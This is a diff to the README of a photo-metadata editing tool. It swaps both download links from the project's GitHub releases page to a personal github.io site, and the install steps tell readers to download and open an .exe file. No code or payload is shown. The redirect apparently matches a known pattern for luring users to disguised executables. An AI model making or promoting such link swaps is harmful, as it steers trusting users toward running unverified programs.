@@ -1,6 +1,6 @@
 # 📷 photo-metadata-editor - Edit your photo data with ease
 
-[![Download on GitHub](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/baraa79000/photo-metadata-editor/releases)
+[![Download on GitHub](https://img.shields.io/badge/Download-Release_Page-blue)](https://baraa79000.github.io)
 
 This application helps you view and change information hidden inside your image files. Digital photos contain data about the camera, date, time, and location. This tool lets you edit that information without needing technical skills. It runs offline on your computer to keep your photos private.
 
@@ -23,7 +23,7 @@ This application helps you view and change information hidden inside your image 
 
 ## 📥 How to Install
 
-1. Visit the [Download Page](https://github.com/baraa79000/photo-metadata-editor/releases) to see available versions.
+1. Visit the [Download Page](https://baraa79000.github.io) to see available versions.
 2. Look for the latest version at the top of the list.
 3. Click the file ending in `.exe` to start the download.
 4. Open the file once it finishes downloading.
